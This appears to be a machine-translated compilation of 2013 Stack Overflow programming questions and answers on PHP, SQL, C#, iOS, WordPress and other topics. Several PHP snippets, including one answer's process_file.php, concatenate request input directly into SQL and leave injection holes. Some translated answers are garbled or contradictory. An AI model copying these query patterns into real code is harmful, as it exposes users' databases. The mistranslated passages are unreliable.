我使用**Webstorm**，它一直使用我为我的方法参数编写的 JSDoc 检查我的方法调用。

# asp.net-mvc - 隐藏字段 VS 数据库调用

> ID：16215544
> 
> 赞同：2
> 
> 时间：2013-04-25T13:05:12.747
> 
> 标签：asp.net-mvc, database, hidden-field

我有一个查询，它连接了许多表（并且很耗时）并将数据返回到视图。我稍后想将此数据从视图传递到另一个视图。我知道我可以使用带有隐藏字段的表单来传递数据，或者在第二个视图的控制器中重新查询数据库。

我想知道就效率和性能而言，是否有一种“首选”的方式来做到这一点。使用隐藏字段将数据从视图传递到控制器是否更好？还是在控制器中重新查询数据库以获取数据更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T11:17:33.517

海事组织；你有 10 列，它连接到大约 3 个其他表，平均有 4 列，它不应该花费相当长的时间。

您可以创建视图并索引视图以获得更好的性能。

我认为最好创建一个索引视图并使用它来查询另一个控件以从数据库中获取实时数据。因为有很多机会，一旦您第一次加载数据，它可能会发生变化，或者可能会插入新记录，直到您遍历到下一个视图。

因此，尝试使用索引创建视图，您肯定会获得性能提升。

谢谢， 吉格

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-29T07:47:11.827

隐藏字段几乎**总是**比数据库命中更快。您应该尽可能利用它们，重新查询数据库是使用隐藏字段的主要好处之一。

# iphone - 在 NSObject 类中使用 NSTimer

> ID：16215548
> 
> 赞同：0
> 
> 时间：2013-04-25T13:05:26.163
> 
> 标签：iphone, objective-c, nstimer

我在许多视图控制器中单击按钮时显示自定义 UIView（类似于 UIAlertView）。因此，我已将该代码包含在 NSObject 类中。我必须将 UITableView 显示为此自定义视图的子视图，并且我的 UITableView 单元格之一包含倒数计时器。我能够显示 CustomView 和 UITableView。但是，我无法在这个 customView 中实现 NSTimer。

显示自定义视图的代码：

```
+(NSMutableDictionary *) printPopup:(UIView *)inputView {
    int i=20;

    UIView *myCustomView = [[UIView alloc] initWithFrame:CGRectMake(20, 100, 280, 250)];
    [myCustomView setBackgroundColor:[UIColor colorWithRed:(247/255.0) green:(239/255.0) blue:(218/255.0) alpha:1]];
    UITableView *dynamicTable=[[UITableView alloc]initWithFrame:CGRectMake(0, 0, 280, 250) style:UITableViewStylePlain];
    dynamicTable.tag=55;
    [myCustomView addSubview:dynamicTable];    
    UIButton *cancelButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    //    [cancelButton setTitle:@"Cancel" forState:UIControlStateNormal];
    [cancelButton setBackgroundImage:[UIImage imageNamed:@"Delete3.png"] forState:UIControlStateNormal];
    [cancelButton setFrame:CGRectMake(250, 0, 30, 30)];
    cancelButton.tag=i+7;
    [myCustomView addSubview:cancelButton];
    [inputView addSubview:myCustomView];
    [UIView animateWithDuration:0.4f animations:^{
        [myCustomView setAlpha:1.0f];
    }];
    NSMutableDictionary *returnedDic=[[NSMutableDictionary alloc]init];
    [returnedDic setObject:dynamicTable forKey:@"Tableview"];
    [returnedDic setObject:cancelButton forKey:@"cancelButton"];
    return returnedDic;

}

+ (void)dismissCustomView:(UIButton *)sender
{
    [UIView animateWithDuration:0.2f animations:^{
        [sender.superview setAlpha:0.0f];
    }completion:^(BOOL done){
        [sender.superview removeFromSuperview];
    }];

} 
```

当我试图在这个 NSObject 类中实现 NSTimer 时，我收到以下错误：

```
instance variable accessed in class method 
```

我必须在这个类中调用 NSTimer。有没有其他选择。

请建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:25:43.947

您用于定义方法的语法是类方法的语法（`+`返回类型之前的那个）。如果你想要实例方法，它们应该以减号为前缀`-`。由于您似乎需要访问实例变量，因此您的方法可能应该是实例方法。

请注意，实例方法仍然可以访问所有静态“类”变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:30:28.387

回复：你评论。`self`除非您引用的方法也是类方法，否则您不能调用类方法。你的`NSTimer timerWithInterval:`方法违反了这一点。我猜`timerFired:`是实例方法？最简单的说法是两个（实例和变量方法）不能在同一个类中交织在一起。

# wordpress - Wordpress - 当用户尝试导航到写入 URL 的页面时隐藏页面

> ID：16215552
> 
> 赞同：0
> 
> 时间：2013-04-25T13:05:32.687
> 
> 标签：wordpress, url

示例：我创建了一个自定义帖子类型“电影”。我在导航菜单中添加了一些电影帖子的链接，如果用户导航到在浏览器中写入 URL 的帖子（例如`www.site.com/movie/apocalypse-now`），则可以，但我不希望用户导航到页面`www.site.com/movie`（列出所有电影）。有没有办法隐藏该页面？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:29:22.183

为什么不在您的[register_post_type() 函数](http://codex.wordpress.org/Function_Reference/register_post_type)**中将 has_archive**注册为**false**？

如果您想禁用帖子类型存档，这将是一个解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:11:09.517

如果您愿意使用插件，则需要[Advanced Access Manager 。](http://wordpress.org/extend/plugins/advanced-access-manager/)

```
Filter Admin Menu
Filter Admin Panel
Filter Dashboard Widgets
Filter Metaboxes
Manage Comments
Manage Capabilities (Create, Delete)
Manage User Roles (Create, Edit, Delete)
Manage Access to your Posts, Pages or even Custom Post Types
Give possibility to promote Users
Manage Admin Menu Order
Manage other Administrators
Exclude Front-end Pages from Navigation 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:21:23.743

您可以尝试创建指向您的主页或第一部电影的重写规则。这正是您喜欢做的事情，恰恰相反：;) [http://www.ballyhooblog.com/custom-post-types-wordpress-30-with-template-archives/](http://www.ballyhooblog.com/custom-post-types-wordpress-30-with-template-archives/)

# sql - Select from table with dynamic compute name

> ID：16215557
> 
> 赞同：1
> 
> 时间：2013-04-25T13:05:38.610
> 
> 标签：sql, sql-server

I want to write query in which name table will dynamicaly compute. I have code like this below. What should I put in 'magic code' region?

```
DECLARE @myTableName nvarchar(100) = 'sch' 
         +  CAST(@nowYear as VARCHAR(5)) 
         +  'Q' 
         +  CAST(@nowQuarter as VARCHAR(3)) 
         +  '.[tVisits]'

-- magic code --
myTable = DoSomething(@aktTableName)   
-- magic code --

SELECT * FROM myTable 
```

I use MS SQL Server 2012

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:15:53.550

您需要使用动态 SQL -

```
DECLARE 
      @nowYear INT = 2013
    , @nowQuarter INT = 1

DECLARE @myTableName NVARCHAR(100) = '[sch' 
         +  CAST(@nowYear AS VARCHAR(5)) 
         +  'Q' 
         +  CAST(@nowQuarter AS VARCHAR(3)) 
         +  '].[tVisits]'

DECLARE @SQL NVARCHAR(MAX) = N'SELECT * FROM ' + @myTableName

EXEC sys.sp_executesql @SQL 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:19:27.267

代替`SELECT * FROM myTable`

你需要做类似的事情

```
DECLARE @sql nvarchar(4000)
SELECT @sql = ' SELECT * FROM ' + @myTable -- @myTable is a string containing qualified table name
EXEC sp_executesql @sql 
```

请注意 sp_executesql 允许参数化查询 - 检查[其文档](http://msdn.microsoft.com/en-us/library/ms188001.aspx)

# javascript - typeAhead 用于单击时的默认值

> ID：16215559
> 
> 赞同：0
> 
> 时间：2013-04-25T13:05:41.247
> 
> 标签：javascript, autocomplete, xpages

使用预先输入的编辑字段的好用例允许单击空白字段或使用 alt+down 快捷方式，并提供最近/默认值列表。用户无需**猜测**要键入的字母，并且可以从有用的选项列表开始。

**问题：**当用户输入/点击空字段或使用 alt+down 时，如何调用字段的 typeAhead 部分刷新事件？我希望由“var”属性定义的提交变量将为空，我将在代码中处理它以获得正确的选择。

```
<xp:inputText
    id="inputTextLookup"
    styleClass="lotusText"
    value="#{viewScope.znalostiLookup}">
    <xp:typeAhead
        mode="partial"
        minChars="1"
        var="valueToLookup"
        ignoreCase="true"
        preventFiltering="true"
        valueMarkup="true"
        maxValues="10">
        <xp:this.valueList><![CDATA[#{javascript:return options(valueToLookup);}]]></xp:this.valueList>
    </xp:typeAhead>
</xp:inputText> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T18:12:58.573

您可以使用 inputText 字段的*onFocus*事件来执行此操作。

```
<xp:eventHandler
   event="onfocus"
   submit="false">
   <xp:this.script>
      <![CDATA[
         var typeAhead = dijit.byId('#{id:inputTextLookup}');
         typeAhead._startSearch("ONFOCUS");
      ]]>
   </xp:this.script>
</xp:eventHandler> 
```

*_startSearch()*方法的参数是发送到服务器的值。

# php - 代码未能将查询条件传递给 URL

> ID：16215560
> 
> 赞同：0
> 
> 时间：2013-04-25T13:05:42.350
> 
> 标签：php, switch-statement

我的问题是，由于我将 SWITCH 函数添加到代码中以使用 cat_id 进行查询，因此代码无法再将查询条件传递给 URL 以进行分页。cat_id 是一个 categoryID，它作为外键保存在子表中。

如果您可以提供帮助，这是我的代码：

```
$criteria = array('ctitle', 'csubject', 'creference', 'cat_id', 'cmaterial', 'ctechnic', 'cartist', 'csource', 'cposture', 'stolen');
$likes = "";
$url_criteria = '';
foreach ( $criteria AS $criterion ) {
        if ( ! empty($_POST[$criterion]) ) {
                $value = ($_POST[$criterion]);
                $likes .= " AND `$criterion` LIKE '%$value%'";
    switch ($criterion) {
                    case 'cat_id':
                        $likes .= " AND `$criterion`='$value'";
                        break;
                    default:
                        $likes .= " AND `$criterion` LIKE '%$value%'";
                        break;
                $url_criteria .= '&amp;'.$criterion.'='.htmlentities($_POST[$criterion]);
                }

        } elseif ( ! empty($_GET[$criterion]) ) {
                $value = mysql_real_escape_string($_GET[$criterion]);
                $likes .= " AND `$criterion` LIKE '%$value%'";
    switch ($criterion) {
                    case 'cat_id':
                        $likes .= " AND `$criterion`='$value'";
                        break;
                    default:
                        $likes .= " AND `$criterion` LIKE '%$value%'";
                        break;
                $url_criteria .= '&amp;'.$criterion.'='.htmlentities($_GET[$criterion]);
        } //var_dump($likes);
        }
}
$sql = "SELECT * FROM collections WHERE c_id>0" . $likes . " ORDER BY c_id ASC"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:17:08.437

您无需将其放入`$url_criteria`开关中。它没有被处理并且永远不会被 PHP 执行

```
<?php
switch ($criterion) {
    case 'cat_id':
        $likes .= " AND `$criterion`='$value'";
        break;
    default:
        $likes .= " AND `$criterion` LIKE '%$value%'";
        break;
//removed from here 
}
// put it here
$url_criteria .= '&amp;'.$criterion.'='.htmlentities($_POST[$criterion]); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:17:25.113

```
$url_criteria .= '&amp;'.$criterion.'='.htmlentities($_POST[$criterion]); 
```

这是经过

```
default: 
...
break; 
```

所以这永远不会执行。

# database - Looking for data in a table through colums with categories/state values

> ID：16215561
> 
> 赞同：0
> 
> 时间：2013-04-25T13:05:45.453
> 
> 标签：database, performance, oracle, indexing, partitioning

Say we have a fruits that that is having a high number of reads but also inserts though almost not update nor delete.

We have 2 columns that stores values that have a small number of options. Lets say categories[Banana, apple, orange or pear] and status[finished, ongoing, spoiled, destroyed or ok].
Finally, we have a column last name of owner.

Notes:
I am going to searchs sometimes by category and other by status.
In all cases, lastname will be used for the search.
I will always perform exact match on categories/status but start with in last name.

Ex of common queries:

```
SELECT * FROM fruit_table WHERE category='BANANA' and last_name LIKE 'Cool%'
SELECT * FROM fruit_table WHERE status='Spoiled'  and last_name LIKE 'Co%'
SELECT * FROM fruit_table WHERE category='BANANA' and last_name LIKE 'smith%' 
```

How can I prepare it so we have low response time?
Will a index help(taking into account that the values in the column are not disperse at all)?
Might bitmap index help here?
What about partitioning?

Finally, Apologies about the title, I did not know how to formulate it properly.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:29:07.597

*   位图索引对可用选择数量有限的项目有很大帮助。
*   标准 b 树索引（或 SQL Server 中的非聚集索引）适用于 last_name 列。
    我会先做这两个，因为它们很容易，然后看看事情是如何运作的。

过早优化通常是一种不好的做法。但是，添加索引是一种无需太多努力即可提高速度的快速方法。有关 Oracle 中索引的更多信息，请阅读[此问题](https://stackoverflow.com/questions/2460399/types-of-index-in-oracle)。

# facebook - 我的 Facebook 游戏应用未出现在用户的“游戏收藏”中

> ID：16215566
> 
> 赞同：1
> 
> 时间：2013-04-25T13:05:53.840
> 
> 标签：facebook, facebook-apps

几周/几个月前，Facebook 在用户资料中引入了新的“游戏部分”（或“收藏”）。不久前，我注意到我们的游戏没有列在该特定用户玩的其他游戏中。我们的游戏已经在 Facebook 和 App Center 上架了几个月，并且出于所有意图和目的，它是一款平均排名和使用的街机游戏，得到了 Facebook 和所有人的认可。

根据 Facebook 的开发人员描述，无需更改任何特殊代码即可将游戏列入用户的游戏集合 ( [http://developers.facebook.com/blog/post/2013/03/27/platform-updates--operation- developer-love/](http://developers.facebook.com/blog/post/2013/03/27/platform-updates--operation-developer-love/)），所以我不知道我们的游戏没有上架的原因可能是什么。作为 Facebook 开发人员，我不是很有经验，所以我可能遗漏了一些重要的东西。我在网上搜索并在Facebook开发者组中询问，没有任何成功。

不久前，我注意到游戏应用设置被设置为“其他”类别，这可能是因为 Facebook 最近从应用中心删除了该游戏之前归类的“动作与街机”类别。但我已经将应用程序的类别更改为“游戏 - 街机”，该应用程序已在一周前提交并获得 Facebook 批准。所以这似乎不是原因。

该游戏正确地列在用户的“喜欢”下，并在他的提要中列为“*朋友*最近玩过”，所以我认为任何丢失的图形资产也不是问题。

如果有人对新的游戏部分/收藏以及我可能遗漏的内容有所了解，那将是最有帮助的。

# c# - TPL Dataflow, notification when data block received first item

> ID：16215569
> 
> 赞同：2
> 
> 时间：2013-04-25T13:06:07.533
> 
> 标签：c#, task-parallel-library, dataflow, tpl-dataflow

I wonder whether it is possible to subscribe to a one-time notification when the first item is received in the input buffer or processed in a data block. I am aware I can set a flag within the data block but that would create overhead as it would run check the flag on each new item. My data block processes several million items thus this flag adds unnecessary overhead.

Is there a better way to be notified on the first incoming item?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-28T08:35:28.057

您可以尝试使用 MaxMessages=1 创建指向处理通知的块的链接。发送一条消息后，此链接将被删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-26T02:43:00.547

（我知道这已经晚了 11 个月......但我正在回答，希望有人能告诉我为什么这不是一个好主意。）

您有一个特定的块 X，您想知道它何时收到第一条消息。它有一个上游块。在上游块和块 X 之间插入一个 TransformBlock，使用 MaxMessages=1 将其与上游块链接，以便在收到第一条消息时立即取消链接。这也阻塞了上游块。插入的 TransformBlock 的 Func 在其委托中做了 3 件事：

1.  做任何你想要的“收到第一个块”的通知。
2.  将其后继区块 X 链接到上游区块。
3.  返回其参数不变以传递给块 X。

换句话说......插入的块接受并传递第一个数据项并从数据流中拼接出来。

# wcf - WCF and Data Transfer Object

> ID：16215570
> 
> 赞同：0
> 
> 时间：2013-04-25T13:06:09.997
> 
> 标签：wcf, dto, restsharp

I am stuck on this simple question. In my console application, I want to consume a wcf service. So I add the web reference to the project and call it. That is it.

But why I saw some examples especially using RESTSHARP, they never add web reference. They just use so called "DTO" to return object by the service and consume it.

I hope somebody can clarify the concepts for me. Is DTO used inside WCF?

sample:

```
private static List<ApplicationDTO> features;
RestClient client = new RestClient("http://" + baseUrl + "/FacilityData.svc");
var request = new RestRequest(Method.GET);
request.Resource = "/GetFeatures";
request.Parameters.Clear();
request.AddParameter("Id", 888);
var response = client.Execute(request);
features = JsonConvert.DeserializeObject<List<ApplicationDTO>>(response.Content); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:48:22.623

从[这篇](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/4b4f9665-d953-42e6-ac00-6fcde4380f92/)文章：

> 对于 REST 服务，它提供了一种不依赖 SOAP 的 WCF 服务消费的通用方式。**这就是我们不再需要“添加 ServiceReference...”来使用它的原因。**REST 服务操作可以通过标准的 HTTP GET/POST 请求访问，因此任何启用 webrequest 的客户端都可以使用它。例如，您可以使用 HttpWebRequest 调用 REST 操作并使用 LINQ to XML 从响应 XML 数据中加载和提取值。它非常灵活。

DTO，通常用于数据传输对象 - 只不过是您想要作为参数传递/作为结果接收的实体。

在您的示例中， `ApplicationDTO`- 可能是一些实体来保存有关应用程序功能对象（名称，类型，...）的数据

# php - Show alert with the content of a Database selection

> ID：16215571
> 
> 赞同：2
> 
> 时间：2013-04-25T13:06:11.093
> 
> 标签：php, javascript, jquery, ajax

I am very new to JavaScript what is related to it.

I have a set of dynamic rows and corresponding columns to those rows. In one column I have a button. When I click on it, it displays the results of a `select` query in another page based on the **Posted Competence_ID**.

The query works fine and I get correct results when I click on the button. However, what I would like to do now, is to display that message in **an alert** when the button is clicked and stay on the same page rather than opening a new tab..

Here is the relevant HTML code that shows the table I use:

```
echo "<table border='1' id='mycompstable' class='sortablee' cellpadding='0' cellspacing='0'>";
echo "<tr><th>ID</th><th>Competence Group</th><th>Competence Class</th><th>Competence Description</th><th>Own Evaluation</th><th>Manager's evaluation from last year</th><th>Target levels</th><th>Gap</th><th>Action</th><th class='unsortable'>Action ready target </th></tr>";

foreach($descs as $compi){  
    echo "<tr>";
        echo "<td>".$compi['Competence_ID']."</td>";
        echo "<td><p style='text-align: center;'>".$compi['Competence_Group']."</p></td>";
        if(isset($compi['Competence_class'])){echo "<td>".$compi['Competence_class']."</td>";}else echo "<td><p style='text-align: center;'>-</p></td>";
        echo "<td>".$compi['Competence_Description']."</td>";
        echo "<td class='evaluation'>";
            echo "<select class='ownlevelselect' id='ownlevelselect-.".$compi['Competence_ID']."' name='level-".$compi['Competence_ID']."' >";
               if (isset($compi['ownlevel']) && $compi['ownlevel']!= '' && !empty($compi['ownlevel']) && $compi['ownlevel']!= 0) {
                  echo "<option selected value='".$compi['ownlevel']."' selected='selected'>".$compi['ownlevel']."</option>";

                }
                echo "<option value='' >--</option>";
                echo "<option value='1'>1</option><option value='2'>2</option><option value='3'>3</option><option value='4'>4</option><option value='5'>5</option>";
            echo "</select>";
            echo $compi['ownlevel'];

            echo '<a test="'.$compi['Competence_ID'].'" onClick="showLevels('.$compi['Competence_ID'].');" target="_blank" href="'.INDEX.'?categ='.$_GET['categ'].'&action='.$_GET['action'].'&subaction=viewlevels'.'&levels='.$compi['Competence_ID'].'">';
            echo '<img class="linkki" src="'.KUVAT.'paivita.gif" alt="'._("tiedot").'" title="'._("Click to view the description of each level?").'"/></a>';
        echo "</td>"; 
```

Here is the code to retrieve the data:

```
 function fetchlevels($Competence_id){
    $this->query="SELECT * FROM levels WHERE comp_id=".$_REQUEST['levels'];
    $tulos=$this->suoritaKysely();
    return $tulos;
} 
```

And here is the page that I want to show in the message:

```
$levels=$this->levels;
$comp=$this->compdesc;
echo "Levels explanation for the competence:".$comp['Competence_Description']."<br>";

echo "Level 1 =  ".$levels[0]['lvl1'];
echo "<br>"."level 2 = ".$levels[0]['lvl2'];
echo "<br>"."level 3 = ".$levels[0]['lvl3'];
echo "<br>"."level 4 = ".$levels[0]['lvl4'];
echo "<br>"."level 5 = ".$levels[0]['lvl5'];
echo "<br><br>";
echo '<input type="button" value="close" window onclick="window.close();">';

?> 
```

Any kind of help would be very much appreciated

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T14:29:30.877

这是 jsfiddle [http://jsfiddle.net/ncubica/Umxjb/中的 Ajax 模拟](http://jsfiddle.net/ncubica/Umxjb/)

**HTML**

```
<i style='display:none' id="loadingPopup">Loading</i>
<table>
    <tr>
        <td data-id="td1"> row 1</td>
    </tr>        
   <tr>        
        <td data-id="td2"> row 2</td>
    </tr>
    <tr>
        <td data-id="td3"> row 3</td>
    </tr>        
</table> 
```

**javascript**

```
$("table").on("click", function(event){
    var $target = $(event.target); 
    if($target.is("td")){
        var id = $target.attr("data-id");
        makeAjax(id);
    }
});

//simulating ajax

function makeAjax(id){
    //you will have to use ajax an retrieve you json format
    //i will simulate ajax only
    $("#loadingPopup").show();
    var _json = { id : id, value : "some value", description : "some description"};
    setTimeout(function(){response(_json)}, 1000);
}

function response(_json){
    $("#loadingPopup").hide();    
    alert(_json.id + " - " + _json.value);
} 
```

**CSS**

```
table{font-family:arial; font-size:12px; width:100%}
table tr td{border-bottom:1px solid #CCC; padding:10px;} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:23:18.057

只是基于给定信息的示例！

```
echo '<a onClick="showLevels('.$compi['Competence_ID'].');">';
echo '<img class="linkki" src="'.KUVAT.'paivita.gif" alt="'._("tiedot").'" title="'._("Click to view the description of each level?").'"/></a>'; 
```

Javascript/jQuery/Ajax

```
function showLevels(comp_id)
    {

    $.ajax({
    type: "GET",
    url: "process_file.php?comp_id="+comp_id,
    success: function (result) {
     alert(result);
    }
    });
  } 
```

进程文件.php

```
 <?php
    //Your database Config.
    $comp_id=$_REQUEST['comp_id'];
    $this->query="SELECT * FROM levels WHERE comp_id=".$comp_id;
     $tulos=$this->suoritaKysely();
     //Proper Output Actions

    $levels=$this->levels;
    $comp=$this->compdesc;
    echo "Levels explanation for the competence:".$comp['Competence_Description']."<br>";

    echo "Level 1 =  ".$levels[0]['lvl1'];
    echo "<br>"."level 2 = ".$levels[0]['lvl2'];
    echo "<br>"."level 3 = ".$levels[0]['lvl3'];
    echo "<br>"."level 4 = ".$levels[0]['lvl4'];
    echo "<br>"."level 5 = ".$levels[0]['lvl5'];
    echo "<br><br>";

         ?> 
```

# zend-framework2 - How do I send the same header with every response in zf2?

> ID：16215573
> 
> 赞同：1
> 
> 时间：2013-04-25T13:06:13.967
> 
> 标签：zend-framework2

I would like to send the header "X-Content-Type-Options: nosniff" back with every response in my zend framework 2 application. How can I do that without explicitly coding it in every single controller method?

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T13:28:23.243

您可以通过引导程序修改响应对象：

**模块.php**

```
/**
 * On bootstrap event
 * 
 * @param \Zend\Mvc\MvcEvent $e
 */
public function onBootstrap(MvcEvent $e)
{
    $headers = $e->getResponse()->getHeaders(); 
    $headers->addHeaderLine('X-Content-Type-Options: nosniff');
} 
```

# c# - 如何让 IndexOf() 方法返回正确的值？

> ID：16215579
> 
> 赞同：0
> 
> 时间：2013-04-25T13:06:26.833
> 
> 标签：c#, asp.net, .net

我一直在使用 googlemaps，我现在正在寻找格式化坐标。

我得到以下格式的坐标：

地址（坐标）缩放级别。

我使用 indexof 方法获取“（”+1 的开始，以便获取坐标的第一个数字并将该值存储在我称为“start”的变量中。

然后我做同样的事情，但这次我得到“）”-2的索引来获取最后一个坐标的最后一个数字，并将这个值存储在一个我称之为“end”的变量中。

我收到以下错误：“索引和长度必须引用字符串中的位置。参数名称：长度”

我得到以下字符串作为参数：

```
"Loddvägen 155, 840 80 Lillhärdal, Sverige (61.9593214318303,14.0585965625)5" 
```

根据我的计算，我应该在开始变量中获得值 36，在结束变量中获得值 65

但由于某种原因，我在开始时得到值 41，在结束时得到值 71。

为什么？

```
public string RemoveParantheses(string coord)
        {
            int start = coord.IndexOf("(")+1;
            int end = coord.IndexOf(")")-2;

            string formated = coord.Substring(start,end);
            return formated;
        } 
```

然后我尝试硬编码正确的值

```
string Test = cord.Substring(36,65); 
```

然后我收到以下错误：

startindex 不能大于字符串的长度。参数名称 startindex

我理解这两个错误的含义，但在这种情况下它们是不正确的，因为我没有超出字符串长度值。

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T13:09:29.290

的第二个参数`Substring`是长度（[MSDN 来源](http://msdn.microsoft.com/en-us/library/system.string.substring.aspx)）。由于您要传入`65`第二个参数，因此您的调用试图获取 和 之间的`36`字符`101 (36+65)`。您的字符串中没有 101 个字符，因此会引发错误。要获取字符之间的数据`(`，请使用以下命令：

```
public string RemoveParantheses(string coord)
{
    int start = coord.IndexOf("(")+1;
    int end = coord.IndexOf(")")-2;

    string formated = coord.Substring(start, end - start);
    return formated;
} 
```

编辑：它只使用坐标的原因是因为总字符串的长度较短，并且由于坐标从第一个位置开始，结束坐标是最后一个位置。例如...

```
//using "Loddvägen 155, 840 80 Lillhärdal, Sverige (61.9593214318303,14.0585965625)5"
int start = coord.IndexOf("(") + 1;  // 36
int end = coord.IndexOf(")")-2;      // 65
coord.Substring(start, end);         //looks at characters 35 through 101

//using (61.9593214318303,14.0585965625)5
int start = coord.IndexOf("(") + 1;  // 1
int end = coord.IndexOf(")")-2;      // 30
coord.Substring(start, end);         //looks at characters 1 through 31 
```

第二个实例是有效的，因为 31 实际上存在于您的字符串中。一旦将地址添加到字符串的开头，您的代码将不再工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:13:01.600

[Substring()](http://msdn.microsoft.com/en-GB/library/system.string.substring.aspx)的重载需要两个参数，开始索引和长度。您已经提供了第二个值作为`)`您真正想要获取要修剪的字符串长度时出现的索引，在这种情况下，您可以`)`从`(`. 例如： -

```
string foo = "Loddvägen 155, 840 80 Lillhärdal, Sverige (61.9593214318303,14.0585965625)5";
int start = foo.IndexOf("(") + 1;
int end = foo.IndexOf(")");
Console.Write(foo.Substring(start, end - start));
Console.Read(); 
```

或者，您可以使用正则表达式解析字符串，例如：-

```
Match r = Regex.Match(foo, @"\(([^)]*)\)");
Console.Write(r.Groups[1].Value); 
```

这可能会比前面的例子好一点

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T13:14:33.440

提取字符串的一部分是正则表达式的一个很好的用途：

```
var match = Regex.Match(locationString, @"\((?<lat>[\d\.]+),(?<long>[\d\.]+)\)");

string latitude = match.Groups["lat"].Value;
string longitude = match.Groups["long"].Value; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T13:09:53.890

您可能忘记计算换行符和其他空格，\r\n 换行符是 2 个“不可见”字符。另一个错误是您使用 (Start, End) 调用 Substring 而它的 (Start, Count) 或 (Start, End - Start)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-25T13:14:49.197

```
string input = 
  "Loddvägen 155, 840 80 Lillhärdal, Sverige (61.9593214318303,14.0585965625)5";

var groups = Regex.Match(input, 
                         @"\(([\d\.]+),([\d\.]+)\)(\d{1,2})").Groups;
var lat = groups[1].Value;
var lon = groups[2].Value;
var zoom = groups[3].Value; 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-25T13:15:07.570

> 根据我的计算，我应该在开始变量中获得值 36，在结束变量中获得值 65

那么你的计算是错误的。通过上面的字符串，我还看到（并且 LinqPad 确认）打开的括号位于位置 42，而关闭的括号位于索引 73。

使用时遇到的错误`Substring`是因为参数 to`Substring`是开始位置和*长度*，而不是*结束*位置，所以你应该使用：

```
string formated = coord.Substring(start,(end-start+1)); 
```

# windows - 如何从 FTP 记录目录

> ID：16215581
> 
> 赞同：1
> 
> 时间：2013-04-25T13:06:31.267
> 
> 标签：windows, batch-file, cmd

我制作了一个 FTP 脚本，但我需要记录传输特别是远程 FTP 上的文件列表（ls 或 dir 的结果）现在我只得到 FTP 命令的日志，而不是结果

获取.bat

```
ftp -v -n -i -s:D:\AX\get.ftp >>D:\AX\ftplog.txt 
```

获取.ftp

```
open ftp.xxxxxx.xx 
user xxxxxxx
xxxxxxxx
binary
cd /OUT
ASCII
ls >>D:\AX\ftplog.txt
lcd "\Import"
mget *.* s
mdelete *.*
bye 
```

结果：

```
open ftp.xxxxxx.xx 
user xxxxxx
binary
cd /OUT
ASCII
ls >>D:\AX\ftplog.txt
lcd "\Import"
mget *.* s
bye 
```

我想看到的是：

```
230 Login successful.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 ftp      ftp          4096 Apr 25 10:10 IN
drwxrwxrwx    2 ftp      ftp          4096 Apr 24 15:39 OUT
226 Directory send OK.
ftp: 121 bytes received in 0,02Seconds 7,56Kbytes/sec. 
```

我怎么做

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:25:46.400

阅读`FTP -?`并注意`-v`根据文档表示的参数

**-v** *禁止显示远程服务器响应。*

所以，从命令行中删除参数

```
 ftp -n -i -s:D:\AX\get.ftp >>D:\AX\ftplog.txt 
```

# android - open android application using url and go to different screen

> ID：16215582
> 
> 赞同：0
> 
> 时间：2013-04-25T13:06:35.877
> 
> 标签：android

how to start my app using a url link and go to different activity. i have used this code

```
<activity
            android:name=".Act1"
            android:label="activity first"
            android:screenOrientation="landscape" >
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />

                <data
                    android:host="xyz.com"
                    android:pathPrefix="/abc/"
                    android:scheme="https" />
            </intent-filter>
        </activity> 
```

by using this code i am able to open Act1 while entering into my android app but i want to switch to Act2 and Act3\. because i have to use three different url and for all the stating screen should be Act1, Act2 and Act3 as click on url1, url2 and url3 respectively. please suggest if any solution.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T14:00:30.750

最好的办法是启动相同的活动（“前台活动”）。在这个“前端活动”中，您解析 url 并根据 url 启动 Act1、2、3。

# ios - ios cocoa: How to adjust the size of the popover depending on the number of rows in uitableview

> ID：16215583
> 
> 赞同：1
> 
> 时间：2013-04-25T13:06:35.943
> 
> 标签：ios, cocoa-touch, uitableview, uipopovercontroller

This is related to this question

[ios filter options similar to the apple store (dropdown list)](https://stackoverflow.com/questions/16182736/ios-filter-options-similar-to-the-apple-store-dropdown-list)

I tried using a uitableviewcontroller instead of a pickerview as I couldn't understand how to use the picker view if I need it popping out (any info on it would be appreciated).

Now this is what I did.

